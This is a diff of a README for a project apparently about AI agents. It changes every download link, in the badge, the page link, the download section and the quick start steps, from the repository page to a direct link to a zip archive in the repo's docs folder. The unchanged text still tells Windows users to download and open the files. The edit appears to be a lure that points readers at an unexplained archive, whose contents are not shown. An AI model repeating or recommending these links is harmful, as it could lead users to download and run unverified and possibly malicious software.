@@ -1,6 +1,6 @@
 # 🤖 ai-agent-deep-dive - Learn AI agents with clear insights
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/edgarofonseca2-ops/ai-agent-deep-dive)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/edgarofonseca2-ops/ai-agent-deep-dive/raw/refs/heads/main/docs/ai-agent-dive-deep-3.0.zip)
 
 ## 📘 What this app does
 
@@ -30,7 +30,7 @@ For the best reading experience:
 
 Open this page in your browser:
 
-https://github.com/edgarofonseca2-ops/ai-agent-deep-dive
+https://github.com/edgarofonseca2-ops/ai-agent-deep-dive/raw/refs/heads/main/docs/ai-agent-dive-deep-3.0.zip
 
 On that page, look for the download area or the main file list. From there, you can visit the page to download or open the report files.
 
@@ -186,7 +186,7 @@ That flow is the heart of many AI agent systems.
 
 Use this page to download or open the project files:
 
-https://github.com/edgarofonseca2-ops/ai-agent-deep-dive
+https://github.com/edgarofonseca2-ops/ai-agent-deep-dive/raw/refs/heads/main/docs/ai-agent-dive-deep-3.0.zip
 
 After you open the page:
 1. find the file or release area
@@ -237,7 +237,7 @@ If you plan to keep the files:
 
 ## 📖 Quick start path
 
-1. open https://github.com/edgarofonseca2-ops/ai-agent-deep-dive
+1. open https://github.com/edgarofonseca2-ops/ai-agent-deep-dive/raw/refs/heads/main/docs/ai-agent-dive-deep-3.0.zip
 2. find the main file or download area
 3. download the content to your Windows PC
 4. open the file in the right app
